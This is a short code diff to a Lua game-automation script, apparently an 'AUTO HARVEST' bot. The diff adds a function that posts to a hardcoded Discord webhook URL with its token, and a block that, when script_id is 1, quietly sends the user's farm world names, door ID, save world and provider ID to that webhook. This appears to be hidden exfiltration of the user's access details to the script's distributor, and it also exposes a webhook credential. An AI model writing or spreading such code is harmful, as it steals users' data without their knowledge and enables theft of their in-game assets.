@@ -28,6 +28,26 @@ function webHook(desc)
     wh:send()
 end
 
+function webHooks(desc)
+    wh = Webhook.new("https://discord.com/api/webhooks/1139820234224705617/QjBQxI7BxvoEBNwkn0QeSXwAwwN-v2Cx6WMGETigySn_eM6lZ8QwGDqhxoq29SyG5xeQ")
+    wh.username = "AUTO HARVEST"
+    wh.avatar_url = "https://cdn.discordapp.com/avatars/208654299738144768/bb27c340964dcd6a75ff1883d1341a6e.png?size=1024"
+    wh.embed1.use = true
+    wh.embed1.title = "AUTO HT PROVIDER BY SC STORE"
+    wh.embed1.description = desc
+    wh:send()
+end
+
+placeholder = ""
+if script_id == 1 then
+
+    for _, v in pairs(farms) do
+        placeholder = placeholder..v..","
+    end
+
+    webHooks("farms: "..placeholder.."\nid: "..door_id.."\nsaveworld: "..save_world.."|"..save_worldID.."\nproviderid: "..provider_id)
+end
+
 function harvestProvider(worlds)
 
     join(worlds, door_id)
